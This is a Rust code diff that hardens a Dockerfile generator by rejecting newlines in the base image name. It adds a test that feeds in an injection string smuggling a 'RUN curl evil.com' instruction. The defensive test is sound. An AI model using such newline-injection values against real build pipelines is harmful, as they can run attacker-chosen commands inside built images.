@@ -45,6 +45,12 @@ pub fn build_type_str(tier: &EnvironmentTier) -> &'static str {
 /// - `poetry.lock` → `poetry install`
 /// - Other → `pip install -r` (best-effort fallback)
 pub fn generate_dockerfile(base_image: &str, lockfile_name: &str) -> String {
+    // Validate base_image: reject newlines and other Dockerfile injection vectors
+    assert!(
+        !base_image.contains('\n') && !base_image.contains('\r'),
+        "base_image must not contain newlines"
+    );
+
     let install_cmd = if lockfile_name == "uv.lock" || lockfile_name.ends_with("/uv.lock") {
         "RUN pip install uv && uv pip install --system --no-cache -r /tmp/lockfile"
     } else if lockfile_name == "poetry.lock" || lockfile_name.ends_with("/poetry.lock") {
@@ -110,6 +116,12 @@ mod tests {
     fn test_dockerfile_unknown_lockfile_falls_back_to_pip() {
         let df = generate_dockerfile("python:3.12", "Pipfile.lock");
         assert!(df.contains("pip install --no-cache-dir -r /tmp/lockfile"));
+    }
+
+    #[test]
+    #[should_panic(expected = "base_image must not contain newlines")]
+    fn test_dockerfile_rejects_newline_in_base_image() {
+        generate_dockerfile("python:3.12\nRUN curl evil.com", "requirements.txt");
     }
 
     // -- image_tag --
